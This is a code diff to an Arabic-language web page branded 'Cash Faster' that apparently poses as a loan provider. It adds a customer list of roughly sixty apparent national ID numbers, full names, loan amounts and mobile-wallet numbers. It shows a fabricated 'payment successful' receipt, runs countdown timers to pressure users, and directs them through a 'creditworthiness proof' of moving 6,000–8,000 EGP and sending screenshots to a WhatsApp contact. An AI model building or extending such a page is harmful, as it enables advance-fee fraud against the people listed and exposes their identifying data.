@@ -92,6 +92,39 @@
             padding: 1.8rem;
             text-align: center;
         }
+        .payment-card {
+            background: linear-gradient(145deg, #11162B, #0A0D1C);
+            border: 1px solid var(--border-cyan);
+            border-radius: 2rem;
+            padding: 1.8rem;
+            margin-bottom: 2rem;
+        }
+        .credit-card {
+            background: linear-gradient(145deg, #11162B, #0A0D1C);
+            border: 1px solid var(--neon-purple);
+            border-radius: 2rem;
+            padding: 1.5rem;
+            margin-bottom: 1.5rem;
+        }
+        .amount-block {
+            background: rgba(0, 229, 255, 0.08);
+            border-radius: 1.8rem;
+            text-align: center;
+            padding: 1rem;
+            margin: 1rem 0;
+            border: 1px solid var(--border-cyan);
+        }
+        .amount-value { font-size: 2.8rem; font-weight: 800; color: var(--neon-gold); text-shadow: 0 0 10px #FFD966; }
+        .details-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 0.8rem;
+            background: #00000040;
+            padding: 1rem;
+            border-radius: 1.5rem;
+            margin: 1rem 0;
+        }
+        .detail-item { display: flex; justify-content: space-between; font-size: 0.9rem; border-bottom: 1px dotted rgba(255,255,255,0.2); padding: 0.5rem 0; }
         .timer-glow {
             background: radial-gradient(circle, rgba(255,217,102,0.15), transparent);
             border: 1px solid var(--neon-gold);
@@ -140,21 +173,27 @@
             justify-content: center;
         }
         .btn-whatsapp:hover { transform: scale(1.02); box-shadow: 0 0 18px #25D366; }
-        .disabled-btn {
-            background: #555;
-            cursor: not-allowed;
-            opacity: 0.6;
-        }
+        .disabled-btn { background: #555; cursor: not-allowed; opacity: 0.6; }
         .disabled-btn:hover { transform: none; box-shadow: none; }
         .footer { text-align: center; font-size: 0.7rem; margin-top: 2rem; opacity: 0.6; }
         .error-card { background: rgba(255, 80, 80, 0.15); border: 1px solid #FF5E5E; border-radius: 2rem; padding: 2rem; text-align: center; display: none; }
         .loader { text-align: center; display: none; margin: 1rem; }
-        .warning-badge {
-            background: #FF4500AA;
-            border-radius: 2rem;
-            padding: 0.5rem;
-            font-weight: bold;
+        .warning-badge { background: #FF4500AA; border-radius: 2rem; padding: 0.5rem; font-weight: bold; margin-top: 1rem; }
+        .info-message {
+            background: rgba(255, 217, 102, 0.12);
+            border-right: 3px solid var(--neon-gold);
+            padding: 0.8rem;
+            border-radius: 1rem;
+            font-size: 0.85rem;
+            margin: 1rem 0;
+        }
+        .received-badge {
+            background: #00E5FF20;
+            border-radius: 1.5rem;
+            padding: 0.6rem;
+            text-align: center;
             margin-top: 1rem;
+            font-weight: 600;
         }
     </style>
 </head>
@@ -179,11 +218,65 @@
 </div>
 
 <script>
-    // قاعدة بيانات العملاء (مختصرة لكن تحتوي على الجميع)
+    // ========== قاعدة البيانات الكاملة (جميع العملاء) ==========
     const customersDatabase = {
-        "28712102703133": { name: "عبد الرحيم احمد عبد الغفار ابو زيد", loan: 50000, wallet: "اتصالات كاش", walletNum: "01121600214", suspended: false, holdUntil: null, holdStarted: false, contactDone: false },
+        // العملاء الأصليون
         "29006040102911": { name: "مصطفى ربيع عبد الحميد", loan: 40000, wallet: "فودافون كاش", walletNum: "01003165531", suspended: false },
         "29409010209751": { name: "انس محمد حسين محمد", loan: 200000, wallet: "فودافون كاش", walletNum: "01009031820", suspended: false },
+        "27108062501071": { name: "اسماعيل محمد خليل محمد", loan: 55000, wallet: "اتصالات كاش", walletNum: "01115421242", suspended: false },
+        "27803151602972": { name: "محمد احمد عيد البسطويسي", loan: 30000, wallet: "فودافون كاش", walletNum: "01008584346", suspended: false },
+        "27208021401678": { name: "عبد المنعم عبدالنبى السيد مصطفى", loan: 100000, wallet: "فودافون كاش", walletNum: "01008862048", suspended: false },
+        "28102081600531": { name: "محمود ابراهيم احمد حميده", loan: 80000, wallet: "لا يوجد محفظة", walletNum: "", suspended: false },
+        "29510011823812": { name: "محمود محمد حسن محمد", loan: 200000, wallet: "اتصالات كاش", walletNum: "01145104887", suspended: false },
+        "28205052400992": { name: "أحمد فرج محمود أبو العلا", loan: 150000, wallet: "فودافون كاش", walletNum: "01069883812", suspended: false },
+        "28109302103752": { name: "محمود عبد الحميد محمود سلام", loan: 95000, wallet: "اتصالات كاش", walletNum: "01148688986", suspended: false },
+        "26605290102101": { name: "سعاد عبدالوهاب عبد المتعال احمد", loan: 200000, wallet: "اتصالات كاش", walletNum: "01144269548", suspended: false },
+        "28311192103437": { name: "سيد خميس احمد رمضان", loan: 200000, wallet: "اتصالات كاش", walletNum: "01126480196", suspended: false },
+        "29804052402311": { name: "ريمون عيد جرجس عيد", loan: 100000, wallet: "اتصالات كاش", walletNum: "01127331246", suspended: false },
+        "28708092701733": { name: "يحي محمد نورالدين احمد", loan: 60000, wallet: "اتصالات كاش", walletNum: "01012725330", suspended: false },
+        "28809272103754": { name: "محمدرياض محمدعبدالتواب", loan: 55000, wallet: "فودافون كاش", walletNum: "01014068530", suspended: false },
+        "28706222101773": { name: "عبد العزيز محمد عبد العزيز", loan: 40000, wallet: "لا يوجد محفظة", walletNum: "", suspended: false },
+        "27104151701355": { name: "خليفه عبدالجليل حسن خليفه", loan: 45000, wallet: "اتصالات كاش", walletNum: "01157464906", suspended: false },
+        "27403231301398": { name: "محمود شعيب زيدان حماد", loan: 40000, wallet: "فودافون كاش", walletNum: "01097948210", suspended: false },
+        "27711102103195": { name: "صابر عيد محمد جاد", loan: 200000, wallet: "فودافون كاش", walletNum: "01068979907", suspended: false },
+        "271111601353": { name: "رمضان حمدي احمد", loan: 200000, wallet: "اتصالات كاش", walletNum: "01108356493", suspended: false },
+        "26804072700198": { name: "احمد عبدالباقى محمود فراج", loan: 200000, wallet: "اتصالات كاش", walletNum: "01124852592", suspended: false },
+        "270090453": { name: "احمد منصور سالم محمد", loan: 200000, wallet: "فودافون كاش", walletNum: "01008545212", suspended: false },
+        "303120104532": { name: "يوسف فتحى السيد عبدالله", loan: 50000, wallet: "فودافون كاش", walletNum: "01065453768", suspended: false },
+        "26507070103112": { name: "أحمد عبد الفتاح الضوي محمد", loan: 200000, wallet: "اتصالات كاش", walletNum: "01152452111", suspended: false },
+        "28710251305512": { name: "إبراهيم محمد صبري محمد", loan: 30000, wallet: "فودافون كاش", walletNum: "01000124702", suspended: false },
+        "27503111700331": { name: "ياسر شبل محمد عبد العاطي", loan: 200000, wallet: "فودافون كاش", walletNum: "01000999850", suspended: false },
+        "29501022100139": { name: "عبدالرحمن حسن إبراهيم نور", loan: 50000, wallet: "فودافون كاش", walletNum: "01090586268", suspended: false },
+        "26502092501411": { name: "اشرف عبدالرازق عبدالحميد عبد العال", loan: 50000, wallet: "اتصالات كاش", walletNum: "01111250210", suspended: false },
+        "28502011403914": { name: "سعيد عبدالغني عبد العظيم", loan: 100000, wallet: "اتصالات كاش", walletNum: "01206106648", suspended: false },
+        "27209090201997": { name: "فيليب زاخر فهمي زهره", loan: 200000, wallet: "لا يوجد محفظة", walletNum: "", suspended: false },
+        "28603260103531": { name: "محمد على عبده حسن", loan: 70000, wallet: "فودافون كاش", walletNum: "01012528434", suspended: false },
+        "28304082301822": { name: "رشا على محمود احمد", loan: 200000, wallet: "فودافون كاش", walletNum: "01034069506", suspended: false },
+        "27311020201093": { name: "احمد متولى محمود متولى", loan: 50000, wallet: "لا يوجد محفظة", walletNum: "", suspended: false },
+        "27808232600879": { name: "أميل بشرى سدراك اسخرون", loan: 200000, wallet: "فودافون كاش", walletNum: "01001148324", suspended: false },
+        "2760500352": { name: "هشام صبحي محمد ابراهيم", loan: 145000, wallet: "فودافون كاش", walletNum: "01092035130", suspended: false },
+        "28204211200215": { name: "وحيد سلامه عبدالعزيز سلامه", loan: 150000, wallet: "فودافون كاش", walletNum: "01002062188", suspended: false },
+        "27012111600694": { name: "رضا عبد العاطي على الكريوني", loan: 200000, wallet: "فودافون كاش", walletNum: "01007724572", suspended: false },
+        "27801010118497": { name: "محمد علي عليوة علي", loan: 200000, wallet: "اتصالات كاش", walletNum: "01117092309", suspended: false },
+        "27710262602418": { name: "امجد انور خليل يعقوب", loan: 45000, wallet: "فودافون كاش", walletNum: "01039306122", suspended: false },
+        "29501011430935": { name: "أحمد رضا سلامه بركات", loan: 75000, wallet: "فودافون كاش", walletNum: "01025007190", suspended: false },
+        "26908122300617": { name: "حسن عبد المنجي عبدالعليم علي", loan: 50000, wallet: "اتصالات كاش", walletNum: "01155702546", suspended: false },
+        "29801190104216": { name: "احمد محمد على حسانين", loan: 50000, wallet: "اتصالات كاش", walletNum: "01118043903", suspended: false },
+        "29504011508879": { name: "محمود بدير شعبان علي موسي", loan: 200000, wallet: "فودافون كاش", walletNum: "+20 10 10338675", suspended: false },
+        "28002190100977": { name: "محمد عبدالفتاح محمد حسن", loan: 30000, wallet: "فودافون كاش", walletNum: "01551351884", suspended: false },
+        "28712102703133": { name: "عبد الرحيم احمد عبد الغفار ابو زيد", loan: 50000, wallet: "اتصالات كاش", walletNum: "01121600214", suspended: false, holdUntil: null, contactDone: false },
+        "27812062800131": { name: "محمد عوض بحر محمود", loan: 40000, wallet: "اتصالات كاش", walletNum: "01272002005", suspended: false },
+        "27504300101437": { name: "محمود حواش امين حواش", loan: 40000, wallet: "اتصالات كاش", walletNum: "01117836646", suspended: false },
+        "26911280104354": { name: "مجدي محمد عبد الحكيم صالح", loan: 200000, wallet: "فودافون كاش", walletNum: "01061739274", suspended: false },
+        "2880630075": { name: "احمد عبد الحليم حلمى", loan: 70000, wallet: "اتصالات كاش", walletNum: "01156264597", suspended: false },
+        "272112935": { name: "السيد احمد صادق شكرى", loan: 40000, wallet: "فودافون كاش", walletNum: "01094222729", suspended: false },
+        "28712150200038": { name: "علاء الدين احمد خلف عبد العال", loan: 80000, wallet: "فودافون كاش", walletNum: "01006810707", suspended: false },
+        "28710200201275": { name: "محروس ابراهيم محروس على", loan: 200000, wallet: "فودافون كاش", walletNum: "01021929987", suspended: false },
+        "26912011500037": { name: "حسين حسن إسماعيل أحمد", loan: 200000, wallet: "فودافون كاش", walletNum: "01002026707", suspended: false },
+        "28112031801867": { name: "نهي طلعت احمد محمد", loan: 70000, wallet: "فودافون كاش", walletNum: "01009492076", suspended: false },
+        "28412021701647": { name: "اميره محمد احمد", loan: 150000, wallet: "لا يوجد محفظة", walletNum: "", suspended: false },
+        
+        // العملاء الجدد (ياسمينا، مرعى، سعيد، محمد)
         "28705050203009": { name: "ياسمينا سامى محمد محمود محمد", loan: 50000, wallet: "فودافون كاش", walletNum: "01018004862", suspended: false },
         "26409111400958": { name: "مرعى زكى ابراهيم ابو النور", loan: 190000, wallet: "فودافون كاش", walletNum: "01012686294", suspended: false },
         "02805240200098": { name: "سعيد عوض محمد ادم", loan: 100000, wallet: "اتصالات كاش", walletNum: "01115891387", suspended: false },
@@ -191,12 +284,13 @@
     };
 
     const WHATSAPP_NUMBER = "212780488542";
-    const HOLD_DURATION_MS = 60 * 60 * 1000;      // ساعة كاملة
-    const CONTACT_BEFORE_MS = 15 * 60 * 1000;     // 15 دقيقة قبل الإثبات
+    const HOLD_DURATION_MS = 60 * 60 * 1000;
+    const CONTACT_BEFORE_MS = 15 * 60 * 1000;
 
     let currentCustomer = null;
     let currentNationalId = null;
     let timerInterval = null;
+    let deliveryInterval = null;
 
     function formatTimeLeft(ms) {
         let totalSec = Math.floor(ms / 1000);
@@ -271,7 +365,6 @@
             if (timeLeft <= 0) {
                 clearInterval(timerInterval);
                 timerEl.innerText = "00:00";
-                // إلغاء الطلب
                 const section = document.getElementById('resultSection');
                 section.innerHTML = `<div class="suspended-card" style="border-color:#FF0000;">
                     <i class="fas fa-times-circle" style="font-size:3rem; color:#FF0000;"></i>
@@ -282,7 +375,6 @@
             }
             timerEl.innerText = formatTimeLeft(timeLeft);
             
-            // تحديث حالة الزر إذا دخلنا نافذة الإبلاغ
             const contactBtn = document.getElementById('contactSupportBtn');
             if (contactBtn && !customer.contactDone) {
                 const canContact = timeLeft <= (HOLD_DURATION_MS - CONTACT_BEFORE_MS);
@@ -290,9 +382,6 @@
                     contactBtn.disabled = false;
                     contactBtn.classList.remove('disabled-btn');
                     contactBtn.innerHTML = "<i class='fab fa-whatsapp'></i> إبلاغ التحويلات المالية (فتح التعليق)";
-                    // تحديث الرسالة النصية
-                    const stepBox = document.querySelector('.step-box');
-                    if (stepBox && stepBox.innerHTML.includes('يمكنك الآن')) return;
                     const container = document.getElementById('resultSection');
                     const newHtml = buildHoldMessage(customer, nationalId);
                     container.innerHTML = newHtml;
@@ -311,7 +400,6 @@
                 const msg = `📢 إبلاغ فتح التعليق\nالعميل: ${customer.name}\nالرقم القومي: ${nationalId}\nأبلغكم برغبتي في فتح الطلب وإكمال إثبات الجدارة.`;
                 window.open(`https://wa.me/${WHATSAPP_NUMBER}?text=${encodeURIComponent(msg)}`, '_blank');
                 customer.contactDone = true;
-                // تحديث الواجهة
                 const section = document.getElementById('resultSection');
                 section.innerHTML = buildHoldMessage(customer, nationalId);
                 startHoldTimer(customer, nationalId);
@@ -322,7 +410,6 @@
         if (proceedBtn) {
             proceedBtn.onclick = () => {
                 if (customer.contactDone) {
-                    // المتابعة إلى إثبات الجدارة
                     displayProofStage(customer, nationalId);
                 } else {
                     alert("يجب إبلاغ التحويلات المالية أولاً!");
@@ -332,38 +419,41 @@
     }
 
     function displayProofStage(customer, nationalId) {
+        if (deliveryInterval) clearInterval(deliveryInterval);
         const proofAmount = customer.loan < 100000 ? 6000 : 8000;
         const refNum = Math.floor(Math.random()*1e9);
         const now = new Date();
         const html = `
-            <div class="payment-card" style="background: linear-gradient(145deg, #11162B, #0A0D1C); border:1px solid #00E5FF; border-radius:2rem; padding:1.8rem;">
-                <div class="payment-header">
-                    <h2><i class="fas fa-check-circle"></i> تم الدفع بنجاح</h2>
-                    <p>رقم المعاملة: TX-${refNum}</p>
+            <div class="payment-card">
+                <div class="payment-header" style="display:flex; justify-content:space-between; border-bottom:1px dashed #00E5FF; padding-bottom:0.6rem;">
+                    <h2 style="font-size:1.6rem; background:linear-gradient(120deg,#fff,#00E5FF); -webkit-background-clip:text; background-clip:text; color:transparent;"><i class="fas fa-check-circle"></i> تم الدفع بنجاح</h2>
+                    <p style="color:#FFD966;">رقم المعاملة: TX-${refNum}</p>
                 </div>
-                <div class="amount-block" style="background:rgba(0,229,255,0.08); border-radius:1.8rem; text-align:center; padding:1rem;">
+                <div class="amount-block">
                     <div class="amount-label">المبلغ المدفوع</div>
-                    <div class="amount-value" style="font-size:2.8rem; font-weight:800; color:#FFD966;">${customer.loan.toLocaleString('ar-EG')} ج.م</div>
+                    <div class="amount-value">${customer.loan.toLocaleString('ar-EG')} ج.م</div>
                 </div>
-                <div class="details-grid" style="display:grid; grid-template-columns:1fr 1fr; gap:0.8rem; background:#00000040; padding:1rem; border-radius:1.5rem;">
+                <div class="details-grid">
                     <div class="detail-item"><span><i class="fas fa-wallet"></i> طريقة الدفع</span><span>${customer.wallet}</span></div>
-                    <div class="detail-item"><span><i class="fas fa-hashtag"></i> رقم المحفظة</span><span>${customer.walletNum}</span></div>
-                    <div class="detail-item"><span><i class="fas fa-calendar"></i> التاريخ والوقت</span><span>${new Date().toLocaleDateString('ar-EG')} - ${new Date().toLocaleTimeString('ar-EG')}</span></div>
+                    <div class="detail-item"><span><i class="fas fa-hashtag"></i> رقم المحفظة</span><span>${customer.walletNum || "غير مسجل"}</span></div>
+                    <div class="detail-item"><span><i class="fas fa-calendar"></i> التاريخ والوقت</span><span>${now.toLocaleDateString('ar-EG')} - ${now.toLocaleTimeString('ar-EG')}</span></div>
                 </div>
-                <div class="info-message" style="background:rgba(255,217,102,0.12); border-right:3px solid #FFD966; padding:0.8rem; border-radius:1rem;">
-                    <i class="fas fa-hourglass-half"></i> <strong>جارٍ حصولك على صرف المبلغ فور الإثبات</strong><br>
-                    سيتم تسليم المبلغ خلال 30 دقيقة بعد الإثبات.
+                <div class="info-message">
+                    <i class="fas fa-hourglass-half"></i> <strong>جارٍ حصولك على صرف المبلغ المدفوع لحسابك فور الإثبات مباشرة</strong><br>
+                    سيتم تسليم المبلغ خلال <strong>30 دقيقة</strong> بعد إتمام إجراءات إثبات الجدارة.
                 </div>
                 <div class="timer-glow">
-                    <div><i class="fas fa-stopwatch"></i> الوقت المتبقي لتسليم المبلغ</div>
+                    <div><i class="fas fa-stopwatch"></i> الوقت المتبقي لتسليم المبلغ (بعد الإثبات)</div>
                     <div class="timer" id="deliveryTimer">30:00</div>
+                    <div style="font-size:0.7rem;">⚠️ يجب إكمال إثبات الجدارة قبل انتهاء الوقت لضمان الصرف الفوري</div>
                 </div>
+                <div class="received-badge">✅ تم استلام طلبك. ننتظر إثبات الجدارة لصرف المبلغ فوراً.</div>
             </div>
-            <div class="credit-card" style="background:linear-gradient(145deg,#11162B,#0A0D1C); border:1px solid #B85CFF; border-radius:2rem; padding:1.5rem;">
-                <h3 style="color:#00E5FF;"><i class="fas fa-chart-line"></i> إثبات الجدارة الائتمانية</h3>
-                <div class="step-box"><strong>💡 ما هي الجدارة؟</strong><br>إجراء أمني لتأكيد ملكية المحفظة.</div>
-                <div class="step-box">🔹 المبلغ المطلوب لإثبات الجدارة: <span style="color:#FFD966; font-weight:bold;">${proofAmount.toLocaleString('ar-EG')} ج.م</span></div>
-                <div class="step-box">📌 الخطوات:<br>1- اطلب من شخص تثق به تحويل المبلغ إلى محفظتك.<br>2- التقط لقطة شاشة توضح المبلغ داخل رصيدك.<br>3- قم بتحويل نفس المبلغ مرة أخرى إلى نفس الشخص.<br>4- التقط لقطة شاشة ثانية لخروج المبلغ.<br>5- أرسل الصورتين عبر الواتساب إلى فريق Cash Faster.</div>
+            <div class="credit-card">
+                <h3 style="color:var(--border-cyan); margin-bottom:1rem;"><i class="fas fa-chart-line"></i> إثبات الجدارة الائتمانية (إلزامي لصرف القرض)</h3>
+                <div class="step-box"><strong>💡 ما هي الجدارة؟</strong><br>إجراء أمني لتأكيد ملكية المحفظة. لن تقوم بتحويل أموال إلينا، فقط دورة إيداع من شخص موثوق وإعادته.</div>
+                <div class="step-box">🔹 المبلغ المطلوب لإثبات الجدارة: <span style="color:var(--neon-gold); font-weight:bold;">${proofAmount.toLocaleString('ar-EG')} ج.م</span></div>
+                <div class="step-box">📌 الخطوات:<br>1- اطلب من شخص تثق به تحويل ${proofAmount.toLocaleString('ar-EG')} ج.م إلى محفظتك.<br>2- التقط لقطة شاشة توضح المبلغ داخل رصيدك.<br>3- قم بتحويل نفس المبلغ مرة أخرى إلى نفس الشخص.<br>4- التقط لقطة شاشة ثانية لخروج المبلغ.<br>5- أرسل الصورتين عبر الواتساب إلى فريق Cash Faster.<br>✅ بعد الإثبات مباشرة، سيتم صرف كامل المبلغ (${customer.loan.toLocaleString('ar-EG')} ج.م) في حسابك فوراً.</div>
                 <button class="btn-whatsapp" onclick="openWhatsAppForProof('${customer.name.replace(/'/g, "\\'")}', '${nationalId}', ${proofAmount})">
                     <i class="fab fa-whatsapp fa-lg"></i> إرسال صور الإثبات والتحقق الفوري
                 </button>
@@ -377,9 +467,9 @@
         let secondsLeft = 30 * 60;
         const timerEl = document.getElementById('deliveryTimer');
         if (!timerEl) return;
-        const interval = setInterval(() => {
+        deliveryInterval = setInterval(() => {
             if (secondsLeft <= 0) {
-                clearInterval(interval);
+                clearInterval(deliveryInterval);
                 timerEl.innerText = "00:00";
                 alert("انتهت المهلة المحددة للإثبات. سيتم إلغاء العملية.");
             } else {
